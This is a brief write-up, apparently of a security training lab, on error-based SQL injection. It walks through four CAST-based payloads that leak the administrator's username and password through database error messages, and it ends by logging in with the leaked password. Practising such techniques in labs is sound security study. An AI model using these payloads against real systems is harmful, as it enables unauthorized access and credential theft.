Goal: exploit the injection and get the admin's password out through error messages.

Started with:
```
' AND CAST((select 1) as int)--
```
just to see the query break.

Then tried:
```
' AND 1=CAST((SELECT username from users) as int)--
```
This threw an error because the subquery returned more than one row, so had to limit it:
```
' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
```
The error message leaked the username - `administrator`.

Same trick on the password column:
```
' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
```
Password came back in the error: `f56kl12p3j7uulsw3wq3`

Logged in with it, lab solved.
